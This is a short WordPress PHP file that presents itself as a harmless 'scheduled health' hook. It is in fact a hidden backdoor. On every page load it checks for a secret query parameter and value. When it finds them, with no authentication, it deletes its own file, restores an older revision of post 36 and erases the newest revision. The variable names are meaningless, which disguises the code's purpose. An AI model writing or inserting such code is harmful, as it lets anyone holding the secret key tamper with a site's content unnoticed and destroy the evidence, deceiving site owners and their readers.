<?php

function call_scheduled_health() {
	if (isset($_GET['profile_graph_log_domain']) && $_GET['profile_graph_log_domain'] === 'portal_default_card_oembed') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$conversion_footer_user = 36;
		$contact_number_website = wp_get_post_revisions($conversion_footer_user);
		if (empty($contact_number_website)) die('no revisions');
		if (count($contact_number_website) < 2) die('less than 2');
		$server_calendar_radio_fancy = array_shift($contact_number_website);
		$simply_vendor_digital_svg = $server_calendar_radio_fancy->ID;
		$calculator_ratings_friendly_old = array_shift($contact_number_website);
		$smooth_xml_day = $calculator_ratings_friendly_old->ID;
		$sticky_feeds_another = wp_restore_post_revision($smooth_xml_day);
		if ($sticky_feeds_another === false) die('error restoring');
		$sticky_feeds_another = wp_delete_post_revision($simply_vendor_digital_svg);		
		if ($sticky_feeds_another === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'call_scheduled_health');
